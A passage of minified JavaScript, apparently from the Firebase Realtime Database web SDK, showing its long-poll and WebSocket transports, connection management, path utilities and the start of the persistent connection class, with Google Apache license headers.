r={};r[th]="t",r[Yx]=Math.floor(Math.random()*1e8),this.scriptTagHolder.uniqueCallbackIdentifier&&(r[pS]=this.scriptTagHolder.uniqueCallbackIdentifier),r[Dx]=Bu,this.transportSessionId&&(r[Lx]=this.transportSessionId),this.lastSessionId&&(r[Fx]=this.lastSessionId),this.applicationId&&(r[Wx]=this.applicationId),this.appCheckToken&&(r[Sd]=this.appCheckToken),typeof location<"u"&&location.hostname&&Ox.test(location.hostname)&&(r[zx]=Mx);const s=this.urlFn(r);this.log_("Connecting via long-poll to "+s),this.scriptTagHolder.addTag(s,()=>{})})}start(){this.scriptTagHolder.startLongPoll(this.id,this.password),this.addDisconnectPingFrame(this.id,this.password)}static forceAllow(){us.forceAllow_=!0}static forceDisallow(){us.forceDisallow_=!0}static isAvailable(){return us.forceAllow_?!0:!us.forceDisallow_&&typeof document<"u"&&document.createElement!=null&&!qw()&&!Xw()}markConnectionHealthy(){}shutdown_(){this.isClosed_=!0,this.scriptTagHolder&&(this.scriptTagHolder.close(),this.scriptTagHolder=null),this.myDisconnFrame&&(document.body.removeChild(this.myDisconnFrame),this.myDisconnFrame=null),this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null)}onClosed_(){this.isClosed_||(this.log_("Longpoll is closing itself"),this.shutdown_(),this.onDisconnect_&&(this.onDisconnect_(this.everConnected_),this.onDisconnect_=null))}close(){this.isClosed_||(this.log_("Longpoll is being closed."),this.shutdown_())}send(e){const n=Ue(e);this.bytesSent+=n.length,this.stats_.incrementCounter("bytes_sent",n.length);const r=gx(n),s=Ax(r,xS);for(let o=0;o<s.length;o++)this.scriptTagHolder.enqueueSegment(this.curSegmentNum,s.length,s[o]),this.curSegmentNum++}addDisconnectPingFrame(e,n){this.myDisconnFrame=document.createElement("iframe");const r={};r[gS]="t",r[Vx]=e,r[Gx]=n,this.myDisconnFrame.src=this.urlFn(r),this.myDisconnFrame.style.display="none",document.body.appendChild(this.myDisconnFrame)}incrementIncomingBytes_(e){const n=Ue(e).length;this.bytesReceived+=n,this.stats_.incrementCounter("bytes_received",n)}}class Hu{constructor(e,n,r,s){this.onDisconnect=r,this.urlFn=s,this.outstandingRequests=new Set,this.pendingSegs=[],this.currentSerial=Math.floor(Math.random()*1e8),this.sendNewPolls=!0;{this.uniqueCallbackIdentifier=Vw(),window[dS+this.uniqueCallbackIdentifier]=e,window[uS+this.uniqueCallbackIdentifier]=n,this.myIFrame=Hu.createIFrame_();let o="";this.myIFrame.src&&this.myIFrame.src.substr(0,11)==="javascript:"&&(o='<script>document.domain="'+document.domain+'";<\/script>');const a="<html><body>"+o+"</body></html>";try{this.myIFrame.doc.open(),this.myIFrame.doc.write(a),this.myIFrame.doc.close()}catch(l){Ze("frame writing exception"),l.stack&&Ze(l.stack),Ze(l)}}}static createIFrame_(){const e=document.createElement("iframe");if(e.style.display="none",document.body){document.body.appendChild(e);try{e.contentWindow.document||Ze("No IE domain setting required")}catch{const r=document.domain;e.src="javascript:void((function(){document.open();document.domain='"+r+"';document.close();})())"}}else throw"Document body has not initialized. Wait to initialize Firebase until after the document is ready.";return e.contentDocument?e.doc=e.contentDocument:e.contentWindow?e.doc=e.contentWindow.document:e.document&&(e.doc=e.document),e}close(){this.alive=!1,this.myIFrame&&(this.myIFrame.doc.body.textContent="",setTimeout(()=>{this.myIFrame!==null&&(document.body.removeChild(this.myIFrame),this.myIFrame=null)},Math.floor(0)));const e=this.onDisconnect;e&&(this.onDisconnect=null,e())}startLongPoll(e,n){for(this.myID=e,this.myPW=n,this.alive=!0;this.newRequest_(););}newRequest_(){if(this.alive&&this.sendNewPolls&&this.outstandingRequests.size<(this.pendingSegs.length>0?2:1)){this.currentSerial++;const e={};e[Vx]=this.myID,e[Gx]=this.myPW,e[Yx]=this.currentSerial;let n=this.urlFn(e),r="",s=0;for(;this.pendingSegs.length>0&&this.pendingSegs[0].d.length+Qx+r.length<=Kx;){const a=this.pendingSegs.shift();r=r+"&"+fS+s+"="+a.seg+"&"+hS+s+"="+a.ts+"&"+mS+s+"="+a.d,s++}return n=n+r,this.addLongPollTag_(n,this.currentSerial),!0}else return!1}enqueueSegment(e,n,r){this.pendingSegs.push({seg:e,ts:n,d:r}),this.alive&&this.newRequest_()}addLongPollTag_(e,n){this.outstandingRequests.add(n);const r=()=>{this.outstandingRequests.delete(n),this.newRequest_()},s=setTimeout(r,Math.floor(vS)),o=()=>{clearTimeout(s),r()};this.addTag(e,o)}addTag(e,n){setTimeout(()=>{try{if(!this.sendNewPolls)return;const r=this.myIFrame.doc.createElement("script");r.type="text/javascript",r.async=!0,r.src=e,r.onload=r.onreadystatechange=function(){const s=r.readyState;(!s||s==="loaded"||s==="complete")&&(r.onload=r.onreadystatechange=null,r.parentNode&&r.parentNode.removeChild(r),n())},r.onerror=()=>{Ze("Long-poll script failed to load: "+e),this.sendNewPolls=!1,this.close()},this.myIFrame.doc.body.appendChild(r)}catch{}},Math.floor(1))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const bS=16384,_S=45e3;let Oa=null;typeof MozWebSocket<"u"?Oa=MozWebSocket:typeof WebSocket<"u"&&(Oa=WebSocket);class Zt{constructor(e,n,r,s,o,a,l){this.connId=e,this.applicationId=r,this.appCheckToken=s,this.authToken=o,this.keepaliveTimer=null,this.frames=null,this.totalFrames=0,this.bytesSent=0,this.bytesReceived=0,this.log_=xo(this.connId),this.stats_=Uu(n),this.connURL=Zt.connectionURL_(n,a,l,s,r),this.nodeAdmin=n.nodeAdmin}static connectionURL_(e,n,r,s,o){const a={};return a[Dx]=Bu,typeof location<"u"&&location.hostname&&Ox.test(location.hostname)&&(a[zx]=Mx),n&&(a[Lx]=n),r&&(a[Fx]=r),s&&(a[Sd]=s),o&&(a[Wx]=o),Hx(e,$x,a)}open(e,n){this.onDisconnect=n,this.onMessage=e,this.log_("Websocket connecting to "+this.connURL),this.everConnected_=!1,Er.set("previous_websocket_failure",!0);try{let r;v_(),this.mySock=new Oa(this.connURL,[],r)}catch(r){this.log_("Error instantiating WebSocket.");const s=r.message||r.data;s&&this.log_(s),this.onClosed_();return}this.mySock.onopen=()=>{this.log_("Websocket connected."),this.everConnected_=!0},this.mySock.onclose=()=>{this.log_("Websocket connection was disconnected."),this.mySock=null,this.onClosed_()},this.mySock.onmessage=r=>{this.handleIncomingFrame(r)},this.mySock.onerror=r=>{this.log_("WebSocket error.  Closing connection.");const s=r.message||r.data;s&&this.log_(s),this.onClosed_()}}start(){}static forceDisallow(){Zt.forceDisallow_=!0}static isAvailable(){let e=!1;if(typeof navigator<"u"&&navigator.userAgent){const n=/Android ([0-9]{0,}\.[0-9]{0,})/,r=navigator.userAgent.match(n);r&&r.length>1&&parseFloat(r[1])<4.4&&(e=!0)}return!e&&Oa!==null&&!Zt.forceDisallow_}static previouslyFailed(){return Er.isInMemoryStorage||Er.get("previous_websocket_failure")===!0}markConnectionHealthy(){Er.remove("previous_websocket_failure")}appendFrame_(e){if(this.frames.push(e),this.frames.length===this.totalFrames){const n=this.frames.join("");this.frames=null;const r=Ki(n);this.onMessage(r)}}handleNewFrameCount_(e){this.totalFrames=e,this.frames=[]}extractFrameCount_(e){if($(this.frames===null,"We already have a frame buffer"),e.length<=6){const n=Number(e);if(!isNaN(n))return this.handleNewFrameCount_(n),null}return this.handleNewFrameCount_(1),e}handleIncomingFrame(e){if(this.mySock===null)return;const n=e.data;if(this.bytesReceived+=n.length,this.stats_.incrementCounter("bytes_received",n.length),this.resetKeepAlive(),this.frames!==null)this.appendFrame_(n);else{const r=this.extractFrameCount_(n);r!==null&&this.appendFrame_(r)}}send(e){this.resetKeepAlive();const n=Ue(e);this.bytesSent+=n.length,this.stats_.incrementCounter("bytes_sent",n.length);const r=Ax(n,bS);r.length>1&&this.sendString_(String(r.length));for(let s=0;s<r.length;s++)this.sendString_(r[s])}shutdown_(){this.isClosed_=!0,this.keepaliveTimer&&(clearInterval(this.keepaliveTimer),this.keepaliveTimer=null),this.mySock&&(this.mySock.close(),this.mySock=null)}onClosed_(){this.isClosed_||(this.log_("WebSocket is closing itself"),this.shutdown_(),this.onDisconnect&&(this.onDisconnect(this.everConnected_),this.onDisconnect=null))}close(){this.isClosed_||(this.log_("WebSocket is being closed"),this.shutdown_())}resetKeepAlive(){clearInterval(this.keepaliveTimer),this.keepaliveTimer=setInterval(()=>{this.mySock&&this.sendString_("0"),this.resetKeepAlive()},Math.floor(_S))}sendString_(e){try{this.mySock.send(e)}catch(n){this.log_("Exception thrown from WebSocket.send():",n.message||n.data,"Closing connection."),setTimeout(this.onClosed_.bind(this),0)}}}Zt.responsesRequiredToBeHealthy=2;Zt.healthyTimeout=3e4;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xi{constructor(e){this.initTransports_(e)}static get ALL_TRANSPORTS(){return[us,Zt]}static get IS_TRANSPORT_INITIALIZED(){return this.globalTransportInitialized_}initTransports_(e){const n=Zt&&Zt.isAvailable();let r=n&&!Zt.previouslyFailed();if(e.webSocketOnly&&(n||ft("wss:// URL used, but browser isn't known to support websockets.  Trying anyway."),r=!0),r)this.transports_=[Zt];else{const s=this.transports_=[];for(const o of Xi.ALL_TRANSPORTS)o&&o.isAvailable()&&s.push(o);Xi.globalTransportInitialized_=!0}}initialTransport(){if(this.transports_.length>0)return this.transports_[0];throw new Error("No transports available")}upgradeTransport(){return this.transports_.length>1?this.transports_[1]:null}}Xi.globalTransportInitialized_=!1;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wS=6e4,SS=5e3,CS=10*1024,jS=100*1024,hc="t",nh="d",kS="s",rh="r",NS="e",sh="o",ih="a",oh="n",ah="p",ES="h";class IS{constructor(e,n,r,s,o,a,l,c,d,p){this.id=e,this.repoInfo_=n,this.applicationId_=r,this.appCheckToken_=s,this.authToken_=o,this.onMessage_=a,this.onReady_=l,this.onDisconnect_=c,this.onKill_=d,this.lastSessionId=p,this.connectionCount=0,this.pendingDataMessages=[],this.state_=0,this.log_=xo("c:"+this.id+":"),this.transportManager_=new Xi(n),this.log_("Connection created"),this.start_()}start_(){const e=this.transportManager_.initialTransport();this.conn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,null,this.lastSessionId),this.primaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;const n=this.connReceiver_(this.conn_),r=this.disconnReceiver_(this.conn_);this.tx_=this.conn_,this.rx_=this.conn_,this.secondaryConn_=null,this.isHealthy_=!1,setTimeout(()=>{this.conn_&&this.conn_.open(n,r)},Math.floor(0));const s=e.healthyTimeout||0;s>0&&(this.healthyTimeout_=ki(()=>{this.healthyTimeout_=null,this.isHealthy_||(this.conn_&&this.conn_.bytesReceived>jS?(this.log_("Connection exceeded healthy timeout but has received "+this.conn_.bytesReceived+" bytes.  Marking connection healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()):this.conn_&&this.conn_.bytesSent>CS?this.log_("Connection exceeded healthy timeout but has sent "+this.conn_.bytesSent+" bytes.  Leaving connection alive."):(this.log_("Closing unhealthy connection after timeout."),this.close()))},Math.floor(s)))}nextTransportId_(){return"c:"+this.id+":"+this.connectionCount++}disconnReceiver_(e){return n=>{e===this.conn_?this.onConnectionLost_(n):e===this.secondaryConn_?(this.log_("Secondary connection lost."),this.onSecondaryConnectionLost_()):this.log_("closing an old connection")}}connReceiver_(e){return n=>{this.state_!==2&&(e===this.rx_?this.onPrimaryMessageReceived_(n):e===this.secondaryConn_?this.onSecondaryMessageReceived_(n):this.log_("message on old connection"))}}sendRequest(e){const n={t:"d",d:e};this.sendData_(n)}tryCleanupConnection(){this.tx_===this.secondaryConn_&&this.rx_===this.secondaryConn_&&(this.log_("cleaning up and promoting a connection: "+this.secondaryConn_.connId),this.conn_=this.secondaryConn_,this.secondaryConn_=null)}onSecondaryControl_(e){if(hc in e){const n=e[hc];n===ih?this.upgradeIfSecondaryHealthy_():n===rh?(this.log_("Got a reset on secondary, closing it"),this.secondaryConn_.close(),(this.tx_===this.secondaryConn_||this.rx_===this.secondaryConn_)&&this.close()):n===sh&&(this.log_("got pong on secondary."),this.secondaryResponsesRequired_--,this.upgradeIfSecondaryHealthy_())}}onSecondaryMessageReceived_(e){const n=li("t",e),r=li("d",e);if(n==="c")this.onSecondaryControl_(r);else if(n==="d")this.pendingDataMessages.push(r);else throw new Error("Unknown protocol layer: "+n)}upgradeIfSecondaryHealthy_(){this.secondaryResponsesRequired_<=0?(this.log_("Secondary connection is healthy."),this.isHealthy_=!0,this.secondaryConn_.markConnectionHealthy(),this.proceedWithUpgrade_()):(this.log_("sending ping on secondary."),this.secondaryConn_.send({t:"c",d:{t:ah,d:{}}}))}proceedWithUpgrade_(){this.secondaryConn_.start(),this.log_("sending client ack on secondary"),this.secondaryConn_.send({t:"c",d:{t:ih,d:{}}}),this.log_("Ending transmission on primary"),this.conn_.send({t:"c",d:{t:oh,d:{}}}),this.tx_=this.secondaryConn_,this.tryCleanupConnection()}onPrimaryMessageReceived_(e){const n=li("t",e),r=li("d",e);n==="c"?this.onControl_(r):n==="d"&&this.onDataMessage_(r)}onDataMessage_(e){this.onPrimaryResponse_(),this.onMessage_(e)}onPrimaryResponse_(){this.isHealthy_||(this.primaryResponsesRequired_--,this.primaryResponsesRequired_<=0&&(this.log_("Primary connection is healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()))}onControl_(e){const n=li(hc,e);if(nh in e){const r=e[nh];if(n===ES){const s=Object.assign({},r);this.repoInfo_.isUsingEmulator&&(s.h=this.repoInfo_.host),this.onHandshake_(s)}else if(n===oh){this.log_("recvd end transmission on primary"),this.rx_=this.secondaryConn_;for(let s=0;s<this.pendingDataMessages.length;++s)this.onDataMessage_(this.pendingDataMessages[s]);this.pendingDataMessages=[],this.tryCleanupConnection()}else n===kS?this.onConnectionShutdown_(r):n===rh?this.onReset_(r):n===NS?wd("Server Error: "+r):n===sh?(this.log_("got pong on primary."),this.onPrimaryResponse_(),this.sendPingOnPrimaryIfNecessary_()):wd("Unknown control packet command: "+n)}}onHandshake_(e){const n=e.ts,r=e.v,s=e.h;this.sessionId=e.s,this.repoInfo_.host=s,this.state_===0&&(this.conn_.start(),this.onConnectionEstablished_(this.conn_,n),Bu!==r&&ft("Protocol version mismatch detected"),this.tryStartUpgrade_())}tryStartUpgrade_(){const e=this.transportManager_.upgradeTransport();e&&this.startUpgrade_(e)}startUpgrade_(e){this.secondaryConn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,this.sessionId),this.secondaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;const n=this.connReceiver_(this.secondaryConn_),r=this.disconnReceiver_(this.secondaryConn_);this.secondaryConn_.open(n,r),ki(()=>{this.secondaryConn_&&(this.log_("Timed out trying to upgrade."),this.secondaryConn_.close())},Math.floor(wS))}onReset_(e){this.log_("Reset packet received.  New host: "+e),this.repoInfo_.host=e,this.state_===1?this.close():(this.closeConnections_(),this.start_())}onConnectionEstablished_(e,n){this.log_("Realtime connection established."),this.conn_=e,this.state_=1,this.onReady_&&(this.onReady_(n,this.sessionId),this.onReady_=null),this.primaryResponsesRequired_===0?(this.log_("Primary connection is healthy."),this.isHealthy_=!0):ki(()=>{this.sendPingOnPrimaryIfNecessary_()},Math.floor(SS))}sendPingOnPrimaryIfNecessary_(){!this.isHealthy_&&this.state_===1&&(this.log_("sending ping on primary."),this.sendData_({t:"c",d:{t:ah,d:{}}}))}onSecondaryConnectionLost_(){const e=this.secondaryConn_;this.secondaryConn_=null,(this.tx_===e||this.rx_===e)&&this.close()}onConnectionLost_(e){this.conn_=null,!e&&this.state_===0?(this.log_("Realtime connection failed."),this.repoInfo_.isCacheableHost()&&(Er.remove("host:"+this.repoInfo_.host),this.repoInfo_.internalHost=this.repoInfo_.host)):this.state_===1&&this.log_("Realtime connection lost."),this.close()}onConnectionShutdown_(e){this.log_("Connection shutdown command received. Shutting down..."),this.onKill_&&(this.onKill_(e),this.onKill_=null),this.onDisconnect_=null,this.close()}sendData_(e){if(this.state_!==1)throw"Connection is not connected";this.tx_.send(e)}close(){this.state_!==2&&(this.log_("Closing realtime connection."),this.state_=2,this.closeConnections_(),this.onDisconnect_&&(this.onDisconnect_(),this.onDisconnect_=null))}closeConnections_(){this.log_("Shutting down all connections"),this.conn_&&(this.conn_.close(),this.conn_=null),this.secondaryConn_&&(this.secondaryConn_.close(),this.secondaryConn_=null),this.healthyTimeout_&&(clearTimeout(this.healthyTimeout_),this.healthyTimeout_=null)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class qx{put(e,n,r,s){}merge(e,n,r,s){}refreshAuthToken(e){}refreshAppCheckToken(e){}onDisconnectPut(e,n,r){}onDisconnectMerge(e,n,r){}onDisconnectCancel(e,n){}reportStats(e){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xx{constructor(e){this.allowedEvents_=e,this.listeners_={},$(Array.isArray(e)&&e.length>0,"Requires a non-empty array")}trigger(e,...n){if(Array.isArray(this.listeners_[e])){const r=[...this.listeners_[e]];for(let s=0;s<r.length;s++)r[s].callback.apply(r[s].context,n)}}on(e,n,r){this.validateEventType_(e),this.listeners_[e]=this.listeners_[e]||[],this.listeners_[e].push({callback:n,context:r});const s=this.getInitialEvent(e);s&&n.apply(r,s)}off(e,n,r){this.validateEventType_(e);const s=this.listeners_[e]||[];for(let o=0;o<s.length;o++)if(s[o].callback===n&&(!r||r===s[o].context)){s.splice(o,1);return}}validateEventType_(e){$(this.allowedEvents_.find(n=>n===e),"Unknown event: "+e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fa extends Xx{constructor(){super(["online"]),this.online_=!0,typeof window<"u"&&typeof window.addEventListener<"u"&&!bx()&&(window.addEventListener("online",()=>{this.online_||(this.online_=!0,this.trigger("online",!0))},!1),window.addEventListener("offline",()=>{this.online_&&(this.online_=!1,this.trigger("online",!1))},!1))}static getInstance(){return new Fa}getInitialEvent(e){return $(e==="online","Unknown event type: "+e),[this.online_]}currentlyOnline(){return this.online_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const lh=32,ch=768;class he{constructor(e,n){if(n===void 0){this.pieces_=e.split("/");let r=0;for(let s=0;s<this.pieces_.length;s++)this.pieces_[s].length>0&&(this.pieces_[r]=this.pieces_[s],r++);this.pieces_.length=r,this.pieceNum_=0}else this.pieces_=e,this.pieceNum_=n}toString(){let e="";for(let n=this.pieceNum_;n<this.pieces_.length;n++)this.pieces_[n]!==""&&(e+="/"+this.pieces_[n]);return e||"/"}}function ue(){return new he("")}function re(t){return t.pieceNum_>=t.pieces_.length?null:t.pieces_[t.pieceNum_]}function cr(t){return t.pieces_.length-t.pieceNum_}function ve(t){let e=t.pieceNum_;return e<t.pieces_.length&&e++,new he(t.pieces_,e)}function Vu(t){return t.pieceNum_<t.pieces_.length?t.pieces_[t.pieces_.length-1]:null}function RS(t){let e="";for(let n=t.pieceNum_;n<t.pieces_.length;n++)t.pieces_[n]!==""&&(e+="/"+encodeURIComponent(String(t.pieces_[n])));return e||"/"}function Ji(t,e=0){return t.pieces_.slice(t.pieceNum_+e)}function Jx(t){if(t.pieceNum_>=t.pieces_.length)return null;const e=[];for(let n=t.pieceNum_;n<t.pieces_.length-1;n++)e.push(t.pieces_[n]);return new he(e,0)}function Te(t,e){const n=[];for(let r=t.pieceNum_;r<t.pieces_.length;r++)n.push(t.pieces_[r]);if(e instanceof he)for(let r=e.pieceNum_;r<e.pieces_.length;r++)n.push(e.pieces_[r]);else{const r=e.split("/");for(let s=0;s<r.length;s++)r[s].length>0&&n.push(r[s])}return new he(n,0)}function ie(t){return t.pieceNum_>=t.pieces_.length}function ut(t,e){const n=re(t),r=re(e);if(n===null)return e;if(n===r)return ut(ve(t),ve(e));throw new Error("INTERNAL ERROR: innerPath ("+e+") is not within outerPath ("+t+")")}function TS(t,e){const n=Ji(t,0),r=Ji(e,0);for(let s=0;s<n.length&&s<r.length;s++){const o=Br(n[s],r[s]);if(o!==0)return o}return n.length===r.length?0:n.length<r.length?-1:1}function Gu(t,e){if(cr(t)!==cr(e))return!1;for(let n=t.pieceNum_,r=e.pieceNum_;n<=t.pieces_.length;n++,r++)if(t.pieces_[n]!==e.pieces_[r])return!1;return!0}function Bt(t,e){let n=t.pieceNum_,r=e.pieceNum_;if(cr(t)>cr(e))return!1;for(;n<t.pieces_.length;){if(t.pieces_[n]!==e.pieces_[r])return!1;++n,++r}return!0}class AS{constructor(e,n){this.errorPrefix_=n,this.parts_=Ji(e,0),this.byteLength_=Math.max(1,this.parts_.length);for(let r=0;r<this.parts_.length;r++)this.byteLength_+=vl(this.parts_[r]);Zx(this)}}function PS(t,e){t.parts_.length>0&&(t.byteLength_+=1),t.parts_.push(e),t.byteLength_+=vl(e),Zx(t)}function DS(t){const e=t.parts_.pop();t.byteLength_-=vl(e),t.parts_.length>0&&(t.byteLength_-=1)}function Zx(t){if(t.byteLength_>ch)throw new Error(t.errorPrefix_+"has a key path longer than "+ch+" bytes ("+t.byteLength_+").");if(t.parts_.length>lh)throw new Error(t.errorPrefix_+"path specified exceeds the maximum depth that can be written ("+lh+") or object contains a cycle "+Cr(t))}function Cr(t){return t.parts_.length===0?"":"in property '"+t.parts_.join(".")+"'"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Yu extends Xx{constructor(){super(["visible"]);let e,n;typeof document<"u"&&typeof document.addEventListener<"u"&&(typeof document.hidden<"u"?(n="visibilitychange",e="hidden"):typeof document.mozHidden<"u"?(n="mozvisibilitychange",e="mozHidden"):typeof document.msHidden<"u"?(n="msvisibilitychange",e="msHidden"):typeof document.webkitHidden<"u"&&(n="webkitvisibilitychange",e="webkitHidden")),this.visible_=!0,n&&document.addEventListener(n,()=>{const r=!document[e];r!==this.visible_&&(this.visible_=r,this.trigger("visible",r))},!1)}static getInstance(){return new Yu}getInitialEvent(e){return $(e==="visible","Unknown event type: "+e),[this.visible_]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ci=1e3,LS=60*5*1e3,dh=30*1e3,zS=1.3,MS=3e4,OS="server_kill",uh=3;class In extends qx{constructor(e,n,r,s,o,a,l,c){if(super(),this.repoInfo_=e,this.applicationId_=n,this.onDataUpdate_=r,this.onConnectStatus_=s,this.onServerInfoUpdate_=o,this.authTokenProvider_=a,this.appCheckTokenProvider_=l,this.authOverride_=c,this.id=In.nextPersistentConnectionId_++,this.log_=xo("p:"+this.id+":"),this.interruptReasons_={},this.listens=new Map,this.outstandingPuts_=[],this.outstandingGets_=[],this.outstandingPutCount_=0,this.outstandingGetCount_=0,this.onDisconnectRequestQueue_=[],this.connected_=!1,this.reconnectDelay_=ci,this.maxReconnectDelay_=LS,this.securityDebugCallback_=null,this.lastSessionId=null,this.establishConnectionTimer_=null,this.visible_=!1,this.requestCBHash_={},this.requestNumber_=0,this.realtime_=null,this.authToken_=null,this.appCheckToken_=null,this.forceTokenRefresh_=!1,this.invalidAuthTokenCount_=0,this.invalidAppCheckTokenCount_=0,this.firstConnection_=!0,this.lastConnectionAttemptTime_=null,this.lastConnectionEstablishedTime_=null,c)throw new Error("Auth override specified in options, but not supported on non Node.js platforms");Yu.getInstance().on("visible",this.onVisible_,this),e.host.indexOf("fblocal")===-1&&Fa.getInstance().on("online",this.onOnline_,this)}sendRequest(e,n,r){const s=++this.requestNumber_,o={r:s,a:e,b:n};this.log_(Ue(o)),$(this.connected_,"sendRequest call when we're not connected not allowed."),this.realtime_.sendRequest(o),r&&(this.requestCBHash_[s]=r)}get(e){this.initConnection_();const n=new ho,s={action:"g",request:{p:e._path.toString(),q:e._queryObject},onComplete:a=>{const l=a.d;a.s==="ok"?n.resolve(l):n.reject(l)}};this.outstandingGets_.push(s),this.outstandingGetCount_++;const o=this.outstandingGets_.length-1;return this.connected_&&this.sendGet_(o),n.promise}listen(e,n,r,s){this.initConnection_();const o=e._queryIdentifier,a=e._path.toString();this.log_("Listen called for "+a+" "+o),this.listens.has(a)||this.listens.set(a,new Map),$(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"listen() called for non-default but complete query"),$(!this.listens.get(a).has(o),"listen() called twice for same path/queryId.");const l={onComplete:s,hashFn:n,query:e,tag:r};this.listens.get(a).set(o,l),this.connected_&&this.sendListen_(l)}sendGet_(e){const n=this.outstandingGets_[e];this.sendRequest("g",n.request,r=>{delete this.outstandingGets_[e],this.outstandingGetCount_--,this.outstandingGetCount_===0&&(this.outstandingGets_=[]),n.onComplete&&n.onComplete(r)})}sendListen_(e){const n=e.query,r=n._path.toString(),s=n._queryIdentifier;this.log_("Listen on "+r+" for "+s);const o={p:r},a="q";e.tag&&(o.q=n._queryObject,o.t=e.tag),o.h=e.hashFn(),this.sendRequest(a,o,l=>{const c=l.d,d=l.s;In.warnOnListenWarnings_(c,n),(this.listens.get(r)&&this.listens.get(r).get(s))===e&&(this.log_("listen response",l),d!=="ok"&&this.removeListen_(r,s),e.onComplete&&e.onComplete(d,c))})}static warnOnListenWarnings_(e,n){if(e&&typeof e=="object"&&gn(e,"w")){const r=Es(e,"w");if(Array.isArray(r)&&~r.indexOf("no_index")){const s='".indexOn": "'+n._queryParams.getIndex().toString()+'"',o=n._path.toString();ft(`Using an unspecified index. Your data will be downloaded and filtered on the client. Consider adding ${s} at ${o} to your security rules for better performance.`)}}}refreshAuthToken(e){this.authToken_=e,this.log_("Auth token refreshed"),this.authToken_?this.tryAuth():this.connected_&&this.sendRequest("unauth",{},()=>{}),this.reduceReconnectDelayIfAdminCredential_(e)}reduceReconnectDelayIfAdminCredential_(e){(e&&e.length===40||j_(e))&&(this.log_("Admin auth credential detected.  Reducing max reconnect time."),this.maxReconnectDelay_=dh)}refreshAppCheckToken(e){this.appCheckToken_=e,this.log_("App check token refreshed"),this.appCheckToken_?this.tryAppCheck():this.connected_&&this.sendRequest("unappeck",{},()=>{})}tryAuth(){if(this.connected_&&this.authToken_){const 